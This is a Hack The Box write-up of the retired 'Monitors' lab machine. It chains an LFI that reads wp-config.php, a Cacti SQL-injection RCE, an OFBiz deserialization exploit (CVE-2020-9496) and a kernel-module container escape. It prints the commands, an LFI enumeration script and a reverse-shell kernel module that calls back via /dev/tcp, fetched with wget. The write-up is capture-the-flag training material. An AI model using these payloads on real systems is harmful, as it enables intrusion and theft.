<!DOCTYPE html>
<html lang="en">
<head>

    <title>HTB Write-up | Monitors</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=09ea8c463e.css" />

    <link rel="canonical" href="index.html" />
    <meta name="referrer" content="no-referrer-when-downgrade" />
    <link rel="amphtml" href="amp/index.html" />
    
    <meta property="og:type" content="article" />
    <meta property="og:title" content="HTB Write-up | Monitors" />
    <meta property="og:description" content="Retired machine can be found here.ScanningLet&#x27;s start the same as always, with a basic nmap scan: ~ nmap -sC -sV -A 10.10.10.238 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST Nmap scan report for 10.10.10.238 Host is up (0.32s" />
    <meta property="og:url" content="inesmartins.github.io/htb-write-up-monitors/" />
    <meta property="og:image" content="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.15.48.png" />
    <meta property="article:published_time" content="2021-10-09T16:17:00.000Z" />
    <meta property="article:modified_time" content="2021-12-31T11:16:26.000Z" />
    <meta property="article:tag" content="htb" />
    <meta property="article:tag" content="wordpress" />
    <meta property="article:tag" content="wpscan" />
    <meta property="article:tag" content="wp-with-spritz" />
    <meta property="article:tag" content="LFI" />
    <meta property="article:tag" content="cacti" />
    <meta property="article:tag" content="rce" />
    <meta property="article:tag" content="sqli" />
    <meta property="article:tag" content="sql injection" />
    <meta property="article:tag" content="docker" />
    <meta property="article:tag" content="apache ofbiz" />
    <meta property="article:tag" content="metasploit" />
    <meta property="article:tag" content="privesc" />
    
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="HTB Write-up | Monitors" />
    <meta name="twitter:description" content="Retired machine can be found here.ScanningLet&#x27;s start the same as always, with a basic nmap scan: ~ nmap -sC -sV -A 10.10.10.238 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST Nmap scan report for 10.10.10.238 Host is up (0.32s" />
    <meta name="twitter:url" content="inesmartins.github.io/htb-write-up-monitors/" />
    <meta name="twitter:image" content="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.15.48.png" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Inês Martins" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="htb, wordpress, wpscan, wp-with-spritz, LFI, cacti, rce, sqli, sql injection, docker, apache ofbiz, metasploit, privesc" />
    <meta property="og:image:width" content="598" />
    <meta property="og:image:height" content="378" />
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "",
        "url": "inesmartins.github.io/",
        "logo": {
            "@type": "ImageObject",
            "url": "inesmartins.github.io/favicon.ico",
            "width": 48,
            "height": 48
        }
    },
    "author": {
        "@type": "Person",
        "name": "Inês Martins",
        "image": {
            "@type": "ImageObject",
            "url": "inesmartins.github.io/content/images/2022/08/1658857349956.jpeg",
            "width": 420,
            "height": 420
        },
        "url": "inesmartins.github.io/author/ines/",
        "sameAs": [
            "https://www.linkedin.com/in/ines-af-martins/"
        ]
    },
    "headline": "HTB Write-up | Monitors",
    "url": "inesmartins.github.io/htb-write-up-monitors/",
    "datePublished": "2021-10-09T16:17:00.000Z",
    "dateModified": "2021-12-31T11:16:26.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.15.48.png",
        "width": 598,
        "height": 378
    },
    "keywords": "htb, wordpress, wpscan, wp-with-spritz, LFI, cacti, rce, sqli, sql injection, docker, apache ofbiz, metasploit, privesc",
    "description": "&gt; Retired machine can be found here [https://app.hackthebox.eu/machines/Monitors].\nScanning\nLet&#x27;s start the same as always, with a basic nmap scan:\n\n~ nmap -sC -sV -A 10.10.10.238\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST\nNmap scan report for 10.10.10.238\nHost is up (0.32s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "inesmartins.github.io/"
    }
}
    </script>

    <meta name="generator" content="Ghost 4.7" />
    <link rel="alternate" type="application/rss+xml" title="" href="../rss/index.html" />
    <script defer src="https://unpkg.com/@tryghost/portal@~1.5.1/umd/portal.min.js" data-ghost="inesmartins.github.io/"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
.gh-post-upgrade-cta {
    display: flex;
    flex-direction: column;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    text-align: center;
    width: 100%;
    color: #ffffff;
    font-size: 16px;
}

.gh-post-upgrade-cta-content {
    border-radius: 8px;
    padding: 40px 4vw;
}

.gh-post-upgrade-cta h2 {
    color: #ffffff;
    font-size: 28px;
    letter-spacing: -0.2px;
    margin: 0;
    padding: 0;
}

.gh-post-upgrade-cta p {
    margin: 20px 0 0;
    padding: 0;
}

.gh-post-upgrade-cta small {
    font-size: 16px;
    letter-spacing: -0.2px;
}

.gh-post-upgrade-cta a {
    color: #ffffff;
    cursor: pointer;
    font-weight: 500;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a:hover {
    color: #ffffff;
    opacity: 0.8;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a.gh-btn {
    display: block;
    background: #ffffff;
    text-decoration: none;
    margin: 28px 0 0;
    padding: 8px 18px;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
}

.gh-post-upgrade-cta a.gh-btn:hover {
    opacity: 0.92;
}</style>
    <link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
<link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180659126-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-180659126-1');
</script>
<!-- Injects copyright and footer -->
<script>
    window.onload = function(e){ 
	    var copyrightElement = document.getElementsByClassName('copyright')[0];
    	copyrightElement.innerHTML = '<p>Inês Martins © 2021</p>'
        copyrightElement.innerHTML += '<p>Contact: <a href="mailto:inesmartins.github.io@pm.me">inesmartins.github.io@pm.me</a></p>'
	    copyrightElement.innerHTML += '<p>Banner by Josan Gonzalez aka <a href="https://www.artstation.com/josan">Death Burger</a>'
        var footerNav = document.getElementsByClassName('site-footer-nav')[0];
        footerNav.innerHTML = '<img src="http://www.hackthebox.eu/badge/image/172261" alt="Hack The Box">'
	}
</script>
<!-- Styles -->
<style>
    .gh-head-actions,
    .footer-cta, 
    .gh-head-button {
        display: none;
    }
    .article-image img {
        max-height: 400px;
        object-fit: contain;
    }
    .site-footer-nav {
        display: block;
    }
    @media (max-width: 800px) {    
	    .site-footer-nav {
    	    margin: 20px auto;
	    }
    }
</style><style>:root {--ghost-accent-color: #000000;}</style>

</head>
<body class="post-template tag-htb tag-wordpress tag-wpscan tag-wp-with-spritz tag-lfi tag-cacti tag-rce tag-sqli tag-sql-injection tag-docker tag-apache-ofbiz tag-metasploit tag-privesc">
<div class="viewport">

    <header id="gh-head" class="gh-head has-cover">
        <nav class="gh-head-inner inner gh-container">

            <div class="gh-head-brand">
                <a class="gh-head-logo" href="../index.html">
                        
                </a>
                <a class="gh-burger" role="button">
                    <div class="gh-burger-box">
                        <div class="gh-burger-inner"></div>
                    </div>
                </a>
            </div>
            <div class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="../index.html">Home</a></li>
    <li class="nav-about"><a href="../about-me/index.html">About</a></li>
</ul>

            </div>
            <div class="gh-head-actions">
                <div class="gh-social">
                </div>

                    <a class="gh-head-button" href="index.html#/portal/signup">Subscribe</a>
            </div>
        </nav>
    </header>

    <main>
        



<article class="article post tag-htb tag-wordpress tag-wpscan tag-wp-with-spritz tag-lfi tag-cacti tag-rce tag-sqli tag-sql-injection tag-docker tag-apache-ofbiz tag-metasploit tag-privesc">

    <header class="article-header gh-canvas">

        <section class="article-tag">
            <a href="../tag/htb/index.html">htb</a>
        </section>

        <h1 class="article-title">HTB Write-up | Monitors</h1>


        <div class="article-byline">
            <section class="article-byline-content">
                <ul class="author-list">
                    <li class="author-list-item">
                        <a href="../author/ines/index.html" class="author-avatar">
                            <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
                        </a>
                    </li>
                </ul>
                <div class="article-byline-meta">
                    <h4 class="author-name"><a href="../author/ines/index.html">Inês Martins</a></h4>
                    <div class="byline-meta-content">
                        <time class="byline-meta-date" datetime="2021-10-09">Oct 9, 2021</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 9 min read</span>
                    </div>
                </div>
            </section>
        </div>

        <figure class="article-image">
            <img
                srcset="../content/images/size/w300/2021/12/Screenshot-2021-12-31-at-11.15.48.png 300w,
                       ../content/images/size/w600/2021/12/Screenshot-2021-12-31-at-11.15.48.png 600w,
                      ../content/images/size/w1000/2021/12/Screenshot-2021-12-31-at-11.15.48.png 1000w,
                     ../content/images/size/w2000/2021/12/Screenshot-2021-12-31-at-11.15.48.png 2000w"
                sizes="(min-width: 1400px) 1400px, 92vw"
                src="../content/images/size/w2000/2021/12/Screenshot-2021-12-31-at-11.15.48.png"
                alt="HTB Write-up | Monitors"
            />
        </figure>
    </header>

    <section class="gh-content gh-canvas">
        <blockquote>Retired machine can be found <a href="https://app.hackthebox.eu/machines/Monitors">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Let's start the same as always, with a basic <code>nmap</code> scan:</p><pre><code>~ nmap -sC -sV -A 10.10.10.238

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST
Nmap scan report for 10.10.10.238
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>There's an <code>Apache</code> web server running on port 80 but we can't access it with the IP alone:</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image.png" class="kg-image" alt loading="lazy" width="723" height="179" srcset="../content/images/size/w600/2021/05/image.png 600w, ../content/images/2021/05/image.png 723w" sizes="(min-width: 720px) 720px"></figure><p>Luckily the virtual host is pretty obvious:</p><pre><code>~ sudo nano /etc/hosts

...
10.10.10.238    monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-2.png" class="kg-image" alt loading="lazy" width="1440" height="720" srcset="../content/images/size/w600/2021/05/image-2.png 600w, ../content/images/size/w1000/2021/05/image-2.png 1000w, ../content/images/2021/05/image-2.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>According to the footer the website was built using Wordpress, so let's run <a href="https://wpscan.com/wordpress-security-scanner">wpscan</a>:</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-19.png" class="kg-image" alt loading="lazy" width="726" height="341" srcset="../content/images/size/w600/2021/05/image-19.png 600w, ../content/images/2021/05/image-19.png 726w" sizes="(min-width: 720px) 720px"></figure><p>The tool found that this instance was using the <a href="http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt">WP with Spritz</a> plugin, more specifically version 1.0, which is vulnerable to unauthenticated RFI.</p><p>As shown on <a href="https://www.exploit-db.com/exploits/44544">this</a> ExploitDB POC, all we need to do to is call a particular path inside the plugin directory - <code>wp.spritz.content.filter.php</code> - with a specific parameter - <code>url</code> - and we can see the content of any accessible file in the system, e.g.:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-55.png" class="kg-image" alt loading="lazy" width="877" height="551" srcset="../content/images/size/w600/2021/05/image-55.png 600w, ../content/images/2021/05/image-55.png 877w"></figure><hr><h2 id="enumerating-with-lfi">Enumerating with LFI</h2><p><code>marcus</code> looks like the most interesting user, and it seems like we're able to access their home directory, but we can't read <code>user.txt</code>. </p><p>Let's try to read the Wordpress configuration file:</p><pre><code>~ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=../../../wp-config.php</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-51.png" class="kg-image" alt loading="lazy" width="959" height="813" srcset="../content/images/size/w600/2021/05/image-51.png 600w, ../content/images/2021/05/image-51.png 959w"></figure><p>So, we have the db name, user and password (which might be re-used somewhere else):</p><pre><code>DB_NAME: 'wordpress'
DB_USER: 'wpadmin'
DB_PASSWORD: 'BestAdministrator@2020!'</code></pre><p>Unfortunately, we don't have permissions to access the database locally and can't access the service from a remote machine. So, let's try some more enumeration using a <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list">handy list</a>:</p><pre><code class="language-python">import os

baseurl = 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=/'

entries = open('lfi_payloads.txt', 'r').read().split('\n')

for entry in entries:
	print('Trying ' + entry)
	os.system('curl ' + baseurl + entry + ' -O')</code></pre><p>After some trial and error we finally get something interesting on <code>etc/apache2/sites-enabled/000-default.conf</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-67.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="exploring-cacti-admin">Exploring cacti-admin</h2><p>Let's configure our new virtual host and access the website:</p><pre><code>~ sudo nano /etc/hosts

...
10.10.10.238    cacti-admin.monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-68.png" class="kg-image" alt loading="lazy" width="1440" height="747" srcset="../content/images/size/w600/2021/05/image-68.png 600w, ../content/images/size/w1000/2021/05/image-68.png 1000w, ../content/images/2021/05/image-68.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Luckily we can use the credentials we found on the last step and get in: <code>admin</code>/<code>BestAdministrator@2020!</code></p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-71.png" class="kg-image" alt loading="lazy" width="1440" height="647" srcset="../content/images/size/w600/2021/05/image-71.png 600w, ../content/images/size/w1000/2021/05/image-71.png 1000w, ../content/images/2021/05/image-71.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Going through the source code, we see that this application is using <a href="https://github.com/Cacti/cacti/releases/tag/release%2F1.2.12">Cacti version 1.2.12</a>, which has a lot of known vulnerabilities including an RCE via SQL Injection.</p><p>And better yet, there's a <a href="https://www.exploit-db.com/exploits/49810">working payload on ExploitDB</a>:</p><pre><code>~ python cacti_exploit.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.14.122 --lport 4444
[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:105acde9cf997ef401f3eaaf5a884e62c9776fa1,1620939044
[+] Trying to log in...
[+] Successfully logged in!

[+] SQL Injection:
"name","hex"
"",""
"admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
"guest","43e9a4ab75570f5b"

[+] Check your nc listener!</code></pre><p>And we have a shell!</p><pre><code>$ whoami
www-data</code></pre><p>Let's upgrade it to an interactive shell:</p><pre><code>~ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@monitors:/usr/share/cacti/cacti</code></pre><hr><h2 id="getting-user">Getting user</h2><pre><code>www-data@monitors:/home/marcus$ su marcus
Password: BestAdministrator@2020!</code></pre><p>After failing to get anything interesting on the user's home directory, I tried to find all files with string "marcus":</p><pre><code>$ grep "marcus" /etc -R 2&gt;/dev/null

/etc/group-:marcus:x:1000:
/etc/subgid:marcus:165536:65536
/etc/group:marcus:x:1000:
/etc/passwd:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh
/etc/subuid:marcus:165536:65536
/etc/passwd-:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
</code></pre><p>The <code>cacti-backup</code> service looks interesting:</p><pre><code>$ cat /etc/systemd/system/cacti-backup.service
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target</code></pre><p>Let's see if we can read the script that's being called:</p><pre><code>$ cat /home/marcus/.backup/backup.sh

#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip</code></pre><p>That's an interesting password 😉</p><pre><code>$ su marcus
su marcus
Password: VerticalEdge2020

marcus@monitors:/usr/share/cacti/cacti$ cat /home/marcus/user.txt
cat /home/marcus/user.txt
1f9e04959870f6cd3c13216d0cf00583</code></pre><p>And now we're able to access via SSH, which is a lot easier:</p><pre><code>~ ssh marcus@monitors.htb
marcus@monitors.htb's password:
&gt; VerticalEdge2020

...

marcus@monitors:~$</code></pre><hr><h2 id="red-herring">Red Herring</h2><p>It seems like <code>marcus</code> left a note in their home directory:</p><pre><code>marcus@monitors:~$ cat note.txt

TODO:

Disable phpinfo	in php.ini		- DONE
Update docker image for production use	-</code></pre><p>Since the Docker image might be deprecated, let's filter out all of the processes running on the machine that are Docker-related:</p><pre><code>$ ps aux | grep docker

root       1527  0.0  2.0 1196956 82704 ?       Ssl  11:42   0:04 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock

root       2006  0.1  0.2 628508  8864 ?        Sl   11:42   0:15 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443

root       2039  0.0  0.1 108820  5768 ?        Sl   11:42   0:01 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/a2e16ca5647428c5f43ce47fd08272fd8738ed80d3db0e6cf4bcb15370bbf184 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc</code></pre><p>Note that all of these are ran by <code>root</code>, and the <code>docker</code> group doesn't contain any user, which means we can't use most of the known privesc Docker vectors:</p><pre><code>$ cat /etc/group | grep docker
docker:x:999:
$ cat /etc/passwd | grep 999</code></pre><p>Let's see what else we can find about this instance of <code>Docker</code> with <a href="https://github.com/stealthcopter/deepce">deepce</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-16.07.27.png" class="kg-image" alt loading="lazy"></figure><p>There doesn't seem to be a known vulnerability for the current Docker version, so we need to go another route.</p><hr><h2 id="apache-ofbiz">Apache OFBiz</h2><p>We know that <code>docker-proxy</code> is mapping the host TCP port <code>8443</code> to the container's (<code>172.17.0.2</code>) TCP port <code>8443</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-15.43.35.png" class="kg-image" alt loading="lazy"></figure><p>So we can SSH tunnel to see what's running on the container:</p><pre><code>~ ssh -L 8443:localhost:8443 marcus@monitors.htb  -fNT 
marcus@monitors.htb's password: 
&gt; VerticalEdge2020

~ ps aux | grep 8443
inesmartins      38886   0.0  0.0  4331440    648   ??  Ss   12:35PM   0:00.00 ssh -L 8443:localhost:8443 marcus@monitors.htb -fNT
</code></pre><p>When we access this address on our local browser we can see this page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-92.png" class="kg-image" alt loading="lazy"></figure><p>A quick scan of the port tells us that the <code>SSL</code> certificate was emitted for <code>ofbiz-vm.apache.org</code>, which points to an <a href="https://ofbiz.apache.org/">Apache OFBiz</a> applications.</p><pre><code>~ nmap -sC -sV -A localhost -p 8443

PORT     STATE SERVICE  VERSION

8443/tcp open  ssl/http Apache Tomcat 9.0.31
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
| ssl-cert: Subject: commonName=ofbiz-vm.apache.org/organizationName=Apache Software Fundation/stateOrProvinceName=DE/countryName=US
...</code></pre><blockquote><strong>Apache OFBiz</strong> is a suite of business applications flexible enough to be used across any industry. A common architecture allows developers to easily extend or enhance it to create custom features.</blockquote><p>This framework has some <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=45&amp;product_id=28350&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=3&amp;trc=33&amp;sha=6402b2a5500eca02d0aa351eb1febae7c45a174a">serious vulnerabilities</a>, one of them being <code>CVE-2020-9496</code> which enables unauthenticated RCE:</p><blockquote>OfBiz exposes an <code>XMLRPC</code> endpoint at <code>/webtools/control/xmlrpc</code>. This is an unauthenticated endpoint since authentication is applied on a per-service basis. However, the <code>XMLRPC</code> request is processed before authentication. As part of this processing, any serialized arguments for the remote invocation are deserialized, therefore if the classpath contains any classes that can be used as gadgets to achieve remote code execution, an attacker will be able to run arbitrary system commands on any OfBiz server with same privileges as the servlet container running OfBiz.</blockquote><p>I found a really <a href="https://github.com/ambalabanov/CVE-2020-9496">great POC on Github</a> and gave it a shot:</p><pre><code>~ git clone git@github.com:ambalabanov/CVE-2020-9496.git
~ cd CVE-2020-9496
~ wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial.jar
~ brew install --cask adoptopenjdk8brew tap adoptopenjdk/openjdk
~ brew tap adoptopenjdk/openjdk
~ java -version
~ export JAVA_HOME=`/usr/libexec/java_home -v 1.8.0_292`</code></pre><p>I setup a local server:</p><pre><code>~ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...</code></pre><p>... and sent a curl command to see if the container would connect to it:</p><pre><code>~ python3 cve-2020-9496.py --target https://localhost:8443
cmd&gt; curl http://10.10.14.9:9000
[!] Send payload ...
[+] Done!</code></pre><p>I got a connection from <code>10.10.10.238</code> which is the host machine's IP, so I knew this was working:</p><pre><code>10.10.10.238 - - [29/Sep/2021 21:37:38] "GET / HTTP/1.1" 200 -
</code></pre><p>With RCE on the container, I decided to make enumeration a little easier and faster with a Python script:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/66ed776a17b81a2313a78ba3456867d0.js"></script><!--kg-card-end: html--><p>After using this script with some <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Seclists</a>, I couldn't find any relevant files or hints, so I started thinking that this was a straightforward container escape.</p><p>I was also getting a little frustrated with not having a shell into the machine, so I decided to abandon my script and give Metasploit a try.</p><p>After some tweaking, I finally got it:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/10/Screenshot-2021-10-02-at-14.10.53.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="the-final-step">The final step</h2><p>This was definitely the hardest part. I knew I had to escape from the container, and tried a lot of known exploits without any luck.</p><p>Finally, after a loooong and frustrating process I found <a href="https://xcellerator.github.io/posts/docker_escape/">this</a> article from 2020: "Privileged Container Escapes with Kernel Modules":</p><blockquote>It turns out that privileged containers (or just those with <code>CAP_SYS_MODULE</code>) are able to use the <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_init_module()</code></a> and <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_finit_module()</code></a> syscalls - which are what’s used to load kernel modules. <br>As all containers share their kernel with the host (unlike VMs), this clearly results in yet another complete system compromise.</blockquote><p>This led me to find <a href="https://blog.nody.cc/posts/container-breakouts-part2/">this</a> POC:</p><figure class="kg-card kg-code-card"><pre><code>#include &lt;linux/kmod.h&gt;
#include &lt;linux/module.h&gt;
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/10.10.10.238/4444 0&gt;&amp;1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/8/", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);</code></pre><figcaption>reverse-shell.c</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</code></pre><figcaption>Makefile</figcaption></figure><p>Note how the reverse shell is targeted at the host machine, on port <code>4444</code>, so we need to setup that listener:</p><pre><code>marcus@monitors:~$ nc -nvlp 4444</code></pre><p>On our machine, let's serve these files so that the container can fetch them using <code>wget</code>:</p><pre><code>~ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...</code></pre><p>Now, on the Metasploit shell, let's fetch the <code>reverse-shell.c</code> and <code>Makefile</code>, build the payload and trigger it:</p><pre><code>&gt; sessions -i 1
[*] Starting interaction with 1...

python -c 'import pty; pty.spawn("/bin/bash")'

root@79931c1ed9a2:/usr/src/apache-ofbiz-17.12.01# whoami
root

root@79931c1ed9a2:/usr/src/apache-ofbiz-17.12.01# cd /

root@79931c1ed9a2:/# wget http://10.10.14.22:9000/reverse-shell.c
root@79931c1ed9a2:/# wget http://10.10.14.22:9000/Makefile
root@79931c1ed9a2:/# export PATH=/usr/lib/gcc/x86_64-linux-gnu/8/:$PATH
root@79931c1ed9a2:/# make clean
root@79931c1ed9a2:/# make
root@79931c1ed9a2:/# insmod reverse-shell.ko</code></pre><p>And that's it!</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/10/Screenshot-2021-10-02-at-14.13.45.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="references">References</h2><ul><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1</a></li><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2</a></li><li><a href="https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html">https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html</a></li><li><a href="https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/">https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/</a></li><li><a href="https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32">https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32</a></li><li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress">https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress</a></li><li><a href="https://alexander.holbreich.org/docker-components-explained/">https://alexander.holbreich.org/docker-components-explained/</a></li><li><a href="https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md">https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md</a></li><li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket</a></li><li><a href="https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html">https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html</a></li><li><a href="https://blog.nody.cc/posts/container-breakouts-part2/">https://blog.nody.cc/posts/container-breakouts-part2/</a></li></ul>
    </section>


</article>

<section class="footer-cta">
    <div class="inner">
        <h2>Sign up for more like this.</h2>
        <a class="footer-cta-button" href="index.html#/portal">
            <div>Enter your email</div>
            <span>Subscribe</span>
        </a>
    </div>
</section>


<aside class="read-more-wrap">
    <div class="read-more inner">


                    
<article class="post-card post ">

